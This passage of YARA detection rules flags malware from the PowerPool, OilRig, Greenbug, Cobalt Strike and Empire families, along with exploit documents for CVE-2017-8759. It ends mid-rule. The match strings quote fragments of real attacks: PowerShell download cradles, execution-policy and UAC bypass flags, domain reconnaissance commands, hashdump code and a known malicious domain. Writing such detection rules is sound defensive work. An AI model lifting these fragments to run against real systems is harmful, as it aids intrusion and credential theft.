rule PowerPool {
    meta:
        author = "ditekshen"
        description = "PowerPool Stage 1 Backdoor Payload"
        cape_type = "PowerPool Payload"
    strings:
        $str1 = "cmd /c powershell.exe " wide
        $str2 = "rar.exe a -r %s.rar" wide
        $str3 = "MyDemonMutex%d" wide
        $str4 = "CMD COMMAND EXCUTE ERROR!" ascii
        $str5 = "/?id=%s&info=%s" wide
        $str6 = "MyScreen.jpg" wide
        $str7 = "proxy.log" wide
    condition:
        uint16(0) == 0x5A4D and 5 of them
}
 
rule FE_LEGALSTRIKE_MACRO {
       meta:version=".1"
       filetype="MACRO"
       author="Ian.Ahl@fireeye.com @TekDefense"
       date="2017-06-02"
       description="This rule is designed to identify macros with the specific encoding used in the sample 30f149479c02b741e897cdb9ecd22da7."
strings:
       // OBSFUCATION
       $ob1 = "ChrW(114) & ChrW(101) & ChrW(103) & ChrW(115) & ChrW(118) & ChrW(114) & ChrW(51) & ChrW(50) & ChrW(46) & ChrW(101)" ascii wide
       $ob2 = "ChrW(120) & ChrW(101) & ChrW(32) & ChrW(47) & ChrW(115) & ChrW(32) & ChrW(47) & ChrW(110) & ChrW(32) & ChrW(47)" ascii wide
       $ob3 = "ChrW(117) & ChrW(32) & ChrW(47) & ChrW(105) & ChrW(58) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115)" ascii wide
       $ob4 = "ChrW(58) & ChrW(47) & ChrW(47) & ChrW(108) & ChrW(121) & ChrW(110) & ChrW(99) & ChrW(100) & ChrW(105) & ChrW(115)" ascii wide
       $ob5 = "ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(46) & ChrW(50) & ChrW(98) & ChrW(117) & ChrW(110)" ascii wide
       $ob6 = "ChrW(110) & ChrW(121) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) & ChrW(65) & ChrW(117) & ChrW(116)" ascii wide
       $ob7 = "ChrW(111) & ChrW(100) & ChrW(105) & ChrW(115) & ChrW(99) & ChrW(111) & ChrW(118) & ChrW(101) & ChrW(114) & ChrW(32)" ascii wide
       $ob8 = "ChrW(115) & ChrW(99) & ChrW(114) & ChrW(111) & ChrW(98) & ChrW(106) & ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108)" ascii wide
       $obreg1 = /(\w{5}\s&\s){7}\w{5}/
       $obreg2 = /(Chrw\(\d{1,3}\)\s&\s){7}/
       // wscript
       $wsobj1 = "Set Obj = CreateObject(\"WScript.Shell\")" ascii wide
       $wsobj2 = "Obj.Run " ascii wide

condition:
        (
              (
                      (uint16(0) != 0x5A4D)
              )
              and
              (
                      all of ($wsobj*) and 3 of ($ob*)
                      or
                      all of ($wsobj*) and all of ($obreg*)
              )
       )
}
rule FE_LEGALSTRIKE_MACRO_2 {
       meta:version=".1"
       filetype="MACRO"
       author="Ian.Ahl@fireeye.com @TekDefense"
       date="2017-06-02"
       description="This rule was written to hit on specific variables and powershell command fragments as seen in the macro found in the XLSX file3a1dca21bfe72368f2dd46eb4d9b48c4."
strings:
       // Setting the environment
       $env1 = "Arch = Environ(\"PROCESSOR_ARCHITECTURE\")" ascii wide
       $env2 = "windir = Environ(\"windir\")" ascii wide
       $env3 = "windir + \"\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"" ascii wide
       // powershell command fragments
       $ps1 = "-NoP" ascii wide
       $ps2 = "-NonI" ascii wide
       $ps3 = "-W Hidden" ascii wide
       $ps4 = "-Command" ascii wide
       $ps5 = "New-Object IO.StreamReader" ascii wide
       $ps6 = "IO.Compression.DeflateStream" ascii wide
       $ps7 = "IO.MemoryStream" ascii wide
       $ps8 = ",$([Convert]::FromBase64String" ascii wide
       $ps9 = "ReadToEnd();" ascii wide
       $psregex1 = /\W\w+\s+\s\".+\"/
condition:
       (
              (
                      (uint16(0) != 0x5A4D)
              )
              and
              (
                      all of ($env*) and 6 of ($ps*)
                      or
                      all of ($env*) and 4 of ($ps*) and all of ($psregex*)
              )
       )
}
rule FE_LEGALSTRIKE_RTF {
    meta:
        version=".1"
        filetype="MACRO"
        author="joshua.kim@FireEye.com"
        date="2017-06-02"
        description="Rtf Phishing Campaign leveraging the CVE 2017-0199 exploit, to point to the domain 2bunnyDOTcom"

    strings:
        $header = "{\\rt"

        $lnkinfo = "4c0069006e006b0049006e0066006f"

        $encoded1 = "4f4c45324c696e6b"
        $encoded2 = "52006f006f007400200045006e007400720079"
        $encoded3 = "4f0062006a0049006e0066006f"
        $encoded4 = "4f006c0065"

        $http1 = "68{"
        $http2 = "74{"
        $http3 = "07{"

        // 2bunny.com
        $domain1 = "32{\\"
        $domain2 = "62{\\"
        $domain3 = "75{\\"
        $domain4 = "6e{\\"
        $domain5 = "79{\\"
        $domain6 = "2e{\\"
        $domain7 = "63{\\"
        $domain8 = "6f{\\"
        $domain9 = "6d{\\"

        $datastore = "\\*\\datastore"

    condition:
        $header at 0 and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-14
   Identifier: Detects malicious files in releation with CVE-2017-8759
   Reference: https://github.com/Voulnet/CVE-2017-8759-Exploit-sample
*/

private rule RTFFILE {
   meta:
      description = "Detects RTF files"
   condition:
      uint32be(0) == 0x7B5C7274
}

/* Rule Set ----------------------------------------------------------------- */

rule CVE_2017_8759_Mal_HTA {
   meta:
      description = "Detects malicious files related to CVE-2017-8759 - file cmd.hta"
      author = "Florian Roth"
      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
      date = "2017-09-14"
      hash1 = "fee2ab286eb542c08fdfef29fabf7796a0a91083a0ee29ebae219168528294b5"
   strings:
      $x1 = "Error = Process.Create(\"powershell -nop cmd.exe /c" fullword ascii
   condition:
      ( uint16(0) == 0x683c and filesize < 1KB and all of them )
}

rule CVE_2017_8759_Mal_Doc {
   meta:
      description = "Detects malicious files related to CVE-2017-8759 - file Doc1.doc"
      author = "Florian Roth"
      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
      date = "2017-09-14"
      hash1 = "6314c5696af4c4b24c3a92b0e92a064aaf04fd56673e830f4d339b8805cc9635"
   strings:
      $s1 = "soap:wsdl=http://" ascii wide nocase
      $s2 = "soap:wsdl=https://" ascii wide nocase

      $c1 = "Project.ThisDocument.AutoOpen" fullword wide
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 500KB and 2 of them )
}

rule CVE_2017_8759_SOAP_via_JS {
   meta:
      description = "Detects SOAP WDSL Download via JavaScript"
      author = "Florian Roth"
      reference = "https://twitter.com/buffaloverflow/status/907728364278087680"
      date = "2017-09-14"
      score = 60
   strings:
      $s1 = "GetObject(\"soap:wsdl=https://" ascii wide nocase
      $s2 = "GetObject(\"soap:wsdl=http://" ascii wide nocase
   condition:
      ( filesize < 3KB and 1 of them )
}

rule CVE_2017_8759_SOAP_Excel {
   meta:
      description = "Detects malicious files related to CVE-2017-8759"
      author = "Florian Roth"
      reference = "https://twitter.com/buffaloverflow/status/908455053345869825"
      date = "2017-09-15"
   strings:
      $s1 = "|'soap:wsdl=" ascii wide nocase
   condition:
      ( filesize < 300KB and 1 of them )
}

rule CVE_2017_8759_SOAP_txt {
   meta:
      description = "Detects malicious file in releation with CVE-2017-8759 - file exploit.txt"
      author = "Florian Roth"
      reference = "https://github.com/Voulnet/CVE-2017-8759-Exploit-sample"
      date = "2017-09-14"
      hash1 = "840ad14e29144be06722aff4cc04b377364eeed0a82b49cc30712823838e2444"
   strings:
      $s1 = /<soap:address location="http[s]?:\/\/[^"]{8,140}.hta"/ ascii wide
      $s2 = /<soap:address location="http[s]?:\/\/[^"]{8,140}mshta.exe"/ ascii wide
   condition:
      ( filesize < 200KB and 1 of them )
}

rule CVE_2017_8759_WSDL_in_RTF {
   meta:
      description = "Detects malicious RTF file related CVE-2017-8759"
      author = "Security Doggo @xdxdxdxdoa"
      reference = "https://twitter.com/xdxdxdxdoa/status/908665278199996416"
      date = "2017-09-15"
   strings:
      $doc = "d0cf11e0a1b11ae1"
      $obj = "\\objupdate"
      $wsdl = "7700730064006c003d00" nocase
      $http1 = "68007400740070003a002f002f00" nocase
      $http2 = "680074007400700073003a002f002f00" nocase
      $http3 = "6600740070003a002f002f00" nocase
   condition:
      RTFFILE and $obj and $doc and $wsdl and 1 of ($http*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule ppaction {

meta:
	ref = "https://blog.nviso.be/2017/06/07/malicious-powerpoint-documents-abusing-mouse-over-actions/amp/"
	Description = "Malicious PowerPoint Documents Abusing Mouse Over Actions"
  hash = "68fa24c0e00ff5bc1e90c96e1643d620d0c4cda80d9e3ebeb5455d734dc29e7"

strings:
$a = "ppaction" nocase
condition:
$a
}

rule powershell {
strings:
$a = "powershell" nocase
condition:
$a
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule Cobalt_functions
{

    meta:

        author="@j0sm1"
        url="https://www.securityartwork.es/2017/06/16/analisis-del-powershell-usado-fin7/"
        description="Detect functions coded with ROR edi,D; Detect CobaltStrike used by differents groups APT"

    strings:

        $h1={58 A4 53 E5} // VirtualAllocEx
        $h2={4C 77 26 07} // LoadLibraryEx
        $h3={6A C9 9C C9} // DNSQuery_UTF8
        $h4={44 F0 35 E0} // Sleep
        $h5={F4 00 8E CC} // lstrlen

    condition:
        2 of ( $h* )
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-25
   Identifier: Greenbug Malware
*/

/* Rule Set ----------------------------------------------------------------- */

rule Greenbug_Malware_1 {
   meta:
      description = "Detects Malware from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25"
      hash1 = "dab460a0b73e79299fbff2fa301420c1d97a36da7426acc0e903c70495db2b76"
   strings:
      $s1 = "vailablez" fullword ascii
      $s2 = "Sfouglr" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule Greenbug_Malware_2 {
   meta:
      description = "Detects Backdoor from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25"
      hash1 = "6b28a43eda5b6f828a65574e3f08a6d00e0acf84cbb94aac5cec5cd448a4649d"
      hash2 = "21f5e60e9df6642dbbceca623ad59ad1778ea506b7932d75ea8db02230ce3685"
      hash3 = "319a001d09ee9d754e8789116bbb21a3c624c999dae9cf83fde90a3fbe67ee6c"
   strings:
      $x1 = "|||Command executed successfully" fullword ascii
      $x2 = "\\Release\\Bot Fresh.pdb" ascii
      $x3 = "C:\\ddd\\a1.txt" fullword wide
      $x4 = "Bots\\Bot5\\x64\\Release" ascii
      $x5 = "Bot5\\Release\\Ism.pdb" ascii
      $x6 = "Bot\\Release\\Ism.pdb" ascii
      $x7 = "\\Bot Fresh\\Release\\Bot" ascii

      $s1 = "/Home/SaveFile?commandId=CmdResult=" fullword wide
      $s2 = "raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday" fullword ascii
      $s3 = "Set-Cookie:\\b*{.+?}\\n" fullword wide
      $s4 = "SELECT * FROM AntiVirusProduct" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) or 2 of them ) ) or ( 3 of them )
}

rule Greenbug_Malware_3 {
   meta:
      description = "Detects Backdoor from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25"
      super_rule = 1
      hash1 = "44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49"
      hash2 = "7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c"
   strings:
      $x1 = "F:\\Projects\\Bot\\Bot\\Release\\Ism.pdb" fullword ascii
      $x2 = "C:\\ddd\\wer2.txt" fullword wide
      $x3 = "\\Microsoft\\Windows\\tmp43hh11.txt" fullword wide
   condition:
      1 of them
}

rule Greenbug_Malware_4 {
   meta:
      description = "Detects ISMDoor Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25"
      super_rule = 1
      hash1 = "308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f"
      hash2 = "82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
   strings:
      $s1 = "powershell.exe -nologo -windowstyle hidden -c \"Set-ExecutionPolicy -scope currentuser" fullword ascii
      $s2 = "powershell.exe -c \"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \"" fullword ascii
      $s3 = "c:\\windows\\temp\\tmp8873" fullword ascii
      $s4 = "taskkill /im winit.exe /f" fullword ascii
      $s5 = "invoke-psuacme"
      $s6 = "-method oobe -payload \"\"" fullword ascii
      $s7 = "C:\\ProgramData\\stat2.dat" fullword wide
      $s8 = "Invoke-bypassuac" fullword ascii
      $s9 = "Start Keylog Done" fullword wide
      $s10 = "Microsoft\\Windows\\WinIt.exe" fullword ascii
      $s11 = "Microsoft\\Windows\\Tmp9932u1.bat\"" fullword ascii
      $s12 = "Microsoft\\Windows\\tmp43hh11.txt" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them ) or ( 3 of them )
}

rule Greenbug_Malware_5 {
   meta:
      description = "Auto-generated rule - from files 308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f, 44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49, 7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c, 82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25"
      super_rule = 1
      hash1 = "308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f"
      hash2 = "44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49"
      hash3 = "7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c"
      hash4 = "82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9"
   strings:
      $x1 = "cmd /u /c WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter" fullword ascii
      $x2 = "cmd /a /c net user administrator /domain >>" fullword ascii
      $x3 = "cmd /a /c netstat -ant >>\"%localappdata%\\Microsoft\\" fullword ascii

      $o1 = "========================== (Net User) ==========================" ascii fullword
   condition:
      filesize < 2000KB and (
         ( uint16(0) == 0x5a4d and 1 of them ) or
         $o1
      )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/* Rule Set ----------------------------------------------------------------- */

rule OilRig_Malware_Campaign_Gen1 
{

   meta:
      description = "Detects malware from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "d808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34"
      hash2 = "80161dad1603b9a7c4a92a07b5c8bce214cf7a3df897b561732f9df7920ecb3e"
      hash3 = "662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f"
      hash4 = "903b6d948c16dc92b69fe1de76cf64ab8377893770bf47c29bf91f3fd987f996"
      hash5 = "c4fbc723981fc94884f0f493cb8711fdc9da698980081d9b7c139fcffbe723da"
      hash6 = "57efb7596e6d9fd019b4dc4587ba33a40ab0ca09e14281d85716a253c5612ef4"
      hash7 = "1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1"
      hash8 = "9f31a1908afb23a1029c079ee9ba8bdf0f4c815addbe8eac85b4163e02b5e777"
      hash9 = "0cd9857a3f626f8e0c07495a4799c59d502c4f3970642a76882e3ed68b790f8e"
      hash10 = "4b5112f0fb64825b879b01d686e8f4d43521252a3b4f4026c9d1d76d3f15b281"
      hash11 = "4e5b85ea68bf8f2306b6b931810ae38c8dff3679d78da1af2c91032c36380353"
      hash12 = "c3c17383f43184a29f49f166a92453a34be18e51935ddbf09576a60441440e51"
      hash13 = "f3856c7af3c9f84101f41a82e36fc81dfc18a8e9b424a3658b6ba7e3c99f54f2"
      hash14 = "0c64ab9b0c122b1903e8063e3c2c357cbbee99de07dc535e6c830a0472a71f39"
      hash15 = "d874f513a032ccb6a5e4f0cd55862b024ea0bee4de94ccf950b3dd894066065d"
      hash16 = "8ee628d46b8af20c4ba70a2fe8e2d4edca1980583171b71fe72455c6a52d15a9"
      hash17 = "55d0e12439b20dadb5868766a5200cbbe1a06053bf9e229cf6a852bfcf57d579"
      hash18 = "528d432952ef879496542bc62a5a4b6eee788f60f220426bd7f933fa2c58dc6b"
      hash19 = "93940b5e764f2f4a2d893bebef4bf1f7d63c4db856877020a5852a6647cb04a0"
      hash20 = "e2ec7fa60e654f5861e09bbe59d14d0973bd5727b83a2a03f1cecf1466dd87aa"
      hash21 = "9c0a33a5dc62933f17506f20e0258f877947bdcd15b091a597eac05d299b7471"
      hash22 = "a787c0e42608f9a69f718f6dca5556607be45ec77d17b07eb9ea1e0f7bb2e064"
      hash23 = "3772d473a2fe950959e1fd56c9a44ec48928f92522246f75f4b8cb134f4713ff"
      hash24 = "3986d54b00647b507b2afd708b7a1ce4c37027fb77d67c6bc3c20c3ac1a88ca4"
      hash25 = "f5a64de9087b138608ccf036b067d91a47302259269fb05b3349964ca4060e7e"

   strings:
      $x1 = "Get-Content $env:Public\\Libraries\\update.vbs) -replace" ascii
      $x2 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {waitfor haha /T 2}\" & Chr(34), 0" fullword ascii
      $x3 = "Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\")" fullword ascii
      $s4 = "CreateObject(\"WScript.Shell\").Run cmd, 0o" fullword ascii
      /* Base64 encode config */
      /* $global:myhost = */
      $b1 = "JGdsb2JhbDpteWhvc3QgP" ascii
      /* HOME="%public%\Libraries\" */
      $b2 = "SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX" ascii
      /* Set wss = CreateObject("wScript.Shell") */
      $b3 = "U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV" ascii
      /* $scriptdir = Split-Path -Parent -Path $ */
      $b4 = "JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA" ascii
      /* \x0aSet wss = CreateObject("wScript.Shell") */
      $b5 = "DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN" ascii
      /* whoami & hostname */
      $b6 = "d2hvYW1pICYgaG9zdG5hb" ascii
 
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 700KB and 1 of them )
}

rule OilRig_Malware_Campaign_Mal1 
{

   meta:
      description = "Detects malware from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "e17e1978563dc10b73fd54e7727cbbe95cc0b170a4e7bd0ab223e059f6c25fcc"

   strings:
      $x1 = "DownloadExecute=\"powershell \"\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(" ascii
      $x2 = "-ExecutionPolicy Bypass -File \"&HOME&\"dns.ps1\"" fullword ascii
      $x3 = "CreateObject(\"WScript.Shell\").Run Replace(DownloadExecute,\"-_\",\"bat\")" fullword ascii
      $x4 = "CreateObject(\"WScript.Shell\").Run DnsCmd,0" fullword ascii
      $s1 = "http://winodwsupdates.me" ascii

   condition:
      ( uint16(0) == 0x4f48 and filesize < 4KB and 1 of them ) or ( 2 of them )
}

rule OilRig_Malware_Campaign_Gen2 
{

   meta:
      description = "Detects malware from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "c6437f57a8f290b5ec46b0933bfa8a328b0cb2c0c7fbeea7f21b770ce0250d3d"
      hash2 = "293522e83aeebf185e653ac279bba202024cedb07abc94683930b74df51ce5cb"

   strings:
      $s1 = "%userprofile%\\AppData\\Local\\Microsoft\\ " fullword ascii
      $s2 = "$fdn=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" fullword ascii
      $s3 = "&{$rn = Get-Random; $id = 'TR" fullword ascii
      $s4 = "') -replace '__',('DNS'+$id) | " fullword ascii
      $s5 = "\\upd.vbs" fullword ascii
      $s6 = "schtasks /create /F /sc minute /mo " fullword ascii
      $s7 = "') -replace '__',('HTP'+$id) | " fullword ascii
      $s8 = "&{$rn = Get-Random -minimum 1 -maximum 10000; $id = 'AZ" fullword ascii
      $s9 = "http://www.israirairlines.com/?mode=page&page=14635&lang=eng<" fullword ascii

   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and 2 of ($s*) ) or ( 4 of them )
}

rule OilRig_Malware_Campaign_Gen3 
{

   meta:
      description = "Detects malware from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "5e9ddb25bde3719c392d08c13a295db418d7accd25d82d020b425052e7ba6dc9"
      hash2 = "bd0920c8836541f58e0778b4b64527e5a5f2084405f73ee33110f7bc189da7a9"
      hash3 = "90639c7423a329e304087428a01662cc06e2e9153299e37b1b1c90f6d0a195ed"

   strings:
      $x1 = "source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr" fullword ascii
      $x2 = "\\Libraries\\fireueye.vbs" fullword ascii
      $x3 = "\\Libraries\\fireeye.vbs&" fullword wide

   condition:
      ( uint16(0) == 0xcfd0 and filesize < 100KB and 1 of them )
}

rule OilRig_Malware_Campaign_Mal2 
{

   meta:
      description = "Detects malware from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "65920eaea00764a245acb58a3565941477b78a7bcc9efaec5bf811573084b6cf"

   strings:
      $x1 = "wss.Run \"powershell.exe \" & Chr(34) & \"& {(Get-Content $env:Public\\Libraries\\update.vbs) -replace '__',(Get-Random) | Set-C" ascii
      $x2 = "Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\")" fullword ascii
      $x3 = "mailto:Mohammed.sarah@gratner.com" fullword wide
      $x4 = "mailto:Tarik.Imam@gartner.com" fullword wide
      $x5 = "Call Extract(DnsPs1, wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\dns.ps1\")" fullword ascii
      $x6 = "2dy53My5vcmcvMjAw" fullword wide /* base64 encoded string 'w.w3.org/200' */

   condition:
      ( uint16(0) == 0xcfd0 and filesize < 200KB and 1 of them )
}

rule OilRig_Campaign_Reconnaissance 
{

   meta:
      description = "Detects Windows discovery commands - known from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "5893eae26df8e15c1e0fa763bf88a1ae79484cdb488ba2fc382700ff2cfab80c"

   strings:
      $s1 = "whoami & hostname & ipconfig /all" ascii
      $s2 = "net user /domain 2>&1 & net group /domain 2>&1" ascii
      $s3 = "net group \"domain admins\" /domain 2>&1 & " ascii

   condition:
      ( filesize < 1KB and 1 of them )
}

rule OilRig_Malware_Campaign_Mal3 
{

   meta:
      description = "Detects malware from OilRig Campaign"
      author = "Florian Roth"
      reference = "https://goo.gl/QMRZ8K"
      date = "2016-10-12"
      hash1 = "02226181f27dbf59af5377e39cf583db15200100eea712fcb6f55c0a2245a378"

   strings:
      $x1 = "(Get-Content $env:Public\\Libraries\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\Libraries\\dns.ps1" fullword ascii
      $x2 = "Invoke-Expression ($global:myhome+'tp\\'+$global:filename+'.bat > '+$global:myhome+'tp\\'+$global:filename+'.txt')" fullword ascii
      $x3 = "('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))" fullword ascii

   condition:
      ( filesize < 10KB and 1 of them )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

rule GEN_PowerShell 
{

    meta:
        description = "Generic PowerShell Malware Rule"
        author = "https://github.com/interleaved"
    
    strings:
        $s1 = "powershell"
        $s2 = "-ep bypass" nocase
        $s3 = "-nop" nocase
        $s10 = "-executionpolicy bypass" nocase
        $s4 = "-win hidden" nocase
        $s5 = "-windowstyle hidden" nocase
        $s11 = "-w hidden" nocase
        /*$s6 = "-noni" fullword ascii*/
        /*$s7 = "-noninteractive" fullword ascii*/
        $s8 = "-enc" nocase
        $s9 = "-encodedcommand" nocase
    
    condition:
        $s1 and (($s2 or $s3 or $s10) and ($s4 or $s5 or $s11) and ($s8 or $s9))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/* Rule Set ----------------------------------------------------------------- */

rule Empire_Invoke_MetasploitPayload {
   meta:
      description = "Detects Empire component - file Invoke-MetasploitPayload.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "a85ca27537ebeb79601b885b35ddff6431860b5852c6a664d32a321782808c54"
   strings:
      $s1 = "$ProcessInfo.Arguments=\"-nop -c $DownloadCradle\"" fullword ascii
      $s2 = "$PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 9KB and 1 of them ) or all of them
}

rule Empire_Exploit_Jenkins {
   meta:
      description = "Detects Empire component - file Exploit-Jenkins.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "a5182cccd82bb9984b804b365e07baba78344108f225b94bd12a59081f680729"
   strings:
      $s1 = "$postdata=\"script=println+new+ProcessBuilder%28%27\"+$($Cmd)+\"" ascii
      $s2 = "$url = \"http://\"+$($Rhost)+\":\"+$($Port)+\"/script\"" fullword ascii
      $s3 = "$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)" fullword ascii
   condition:
      ( uint16(0) == 0x6620 and filesize < 7KB and 1 of them ) or all of them
}

rule Empire_Get_SecurityPackages {
   meta:
      description = "Detects Empire component - file Get-SecurityPackages.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "5d06e99121cff9b0fce74b71a137501452eebbcd1e901b26bde858313ee5a9c1"
   strings:
      $s1 = "$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)" fullword ascii
      $s2 = "$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
}

rule Empire_Invoke_PowerDump {
   meta:
      description = "Detects Empire component - file Invoke-PowerDump.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "095c5cf5c0c8a9f9b1083302e2ba1d4e112a410e186670f9b089081113f5e0e1"
   strings:
      $x16 = "$enc = Get-PostHashdumpScript" fullword ascii
      $x19 = "$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;" fullword ascii
      $x20 = "$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);" fullword ascii
   condition:
      ( uint16(0) == 0x2023 and filesize < 60KB and 1 of them ) or all of them
}

rule Empire_Install_SSP {
   meta:
      description = "Detects Empire component - file Install-SSP.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "7fd921a23950334257dda57b99e03c1e1594d736aab2dbfe9583f99cd9b1d165"
   strings:
      $s1 = "Install-SSP -Path .\\mimilib.dll" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
}

rule Empire_Invoke_ShellcodeMSIL {
   meta:
      description = "Detects Empire component - file Invoke-ShellcodeMSIL.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "9a9c6c9eb67bde4a8ce2c0858e353e19627b17ee2a7215fa04a19010d3ef153f"
   strings:
      $s1 = "$FinalShellcode.Length" fullword ascii
      $s2 = "@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)" fullword ascii
      $s3 = "@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57," fullword ascii
      $s4 = "$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}

rule Empire__Users_neo_code_Workspace_Empire_4sigs_PowerUp {
   meta:
      description = "Detects Empire component - file PowerUp.ps1"
      author = "Florian Roth"
      reference = "https://github.com/adaptivethreat/Empire"
      date = "2016-11-05"
      hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
   strings:
      $x2 = "$PoolPasswordCmd = 'c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool" fullword ascii
   condition:
